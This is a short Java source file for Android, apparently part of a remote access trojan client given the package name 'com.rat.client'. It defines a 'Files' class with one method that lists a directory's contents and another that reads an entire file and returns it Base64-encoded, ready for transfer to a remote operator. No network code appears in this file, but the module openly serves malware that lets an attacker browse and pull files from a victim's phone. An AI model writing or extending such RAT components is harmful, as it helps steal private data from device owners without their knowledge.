package com.rat.client;

import java.io.File;
import java.io.FileInputStream;
import android.util.Base64;

public class Files {
    public static String list(String path) {
        try {
            File f = new File(path);
            File[] fs = f.listFiles();
            if (fs == null) return "empty";
            StringBuilder sb = new StringBuilder();
            for (File x : fs) {
                sb.append(x.isDirectory() ? "[D] " : "[F] ")
                  .append(x.getName()).append("\n");
            }
            return sb.toString();
        } catch (Exception e) {
            return "ERR:" + e.getMessage();
        }
    }

    public static String read(String path) {
        try {
            File f = new File(path);
            byte[] b = new byte[(int) f.length()];
            FileInputStream in = new FileInputStream(f);
            in.read(b); in.close();
            return Base64.encodeToString(b, Base64.DEFAULT);
        } catch (Exception e) {
            return "ERR:" + e.getMessage();
        }
    }
}
